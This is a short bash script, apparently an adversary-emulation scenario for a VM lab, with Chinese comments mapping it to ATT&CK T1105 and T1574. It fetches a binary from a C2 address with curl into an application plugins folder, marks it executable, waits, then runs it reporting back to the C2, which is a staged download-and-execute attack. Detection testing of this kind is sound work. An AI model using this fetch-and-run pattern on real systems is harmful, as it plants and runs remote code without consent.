#!/usr/bin/env bash
# S3 apt-staged-drop（VM 拓扑版）：落盘与执行分属不同 lineage、错峰。
# ATT&CK: T1105 落盘 + T1574 后续加载执行。
# 注意:本脚本在 node-a VM 内执行(capture-vm.sh 通过 vagrant ssh 调用),不要再用 vagrant ssh。
set -euo pipefail
C2="${C2:-10.66.0.99}"
GAP="${GAP:-8}"

curl -s http://$C2:8080/helper -o /var/lib/app/plugins/helper
chmod +x /var/lib/app/plugins/helper

sleep "$GAP"

/var/lib/app/plugins/helper --report http://$C2:443
echo "[apt-staged-drop] two-stage cross-lineage attack executed (vm)"
